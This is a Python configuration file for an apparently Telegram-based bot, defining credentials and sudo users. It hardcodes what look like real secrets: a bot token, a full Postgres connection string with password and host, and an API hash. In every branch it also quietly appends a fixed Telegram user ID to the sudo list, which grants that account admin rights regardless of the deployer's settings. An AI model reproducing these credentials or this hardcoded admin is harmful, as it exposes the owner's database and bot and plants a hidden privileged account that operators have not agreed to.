import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "1138315374:AAEB0Glgvvosjqk1BkTa4OAj6YdrOKEEYRg"
    DATABASE_URL = "postgres://pxennzzsgypxae:6aac2bf65d8b2f1cf19a66eb0ad47d26d701ae1ed84439b49e9b7d90840c999b@ec2-54-225-214-37.compute-1.amazonaws.com:5432/dc9l2jc4rosjj7"
    APP_ID = "1948374"
    API_HASH = "113be69e13bf6f71583fb0783b1ab841"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**rusak**"
      ]

      START_MSG = "**p [{}](tg://user?id={})**\n__rusak"
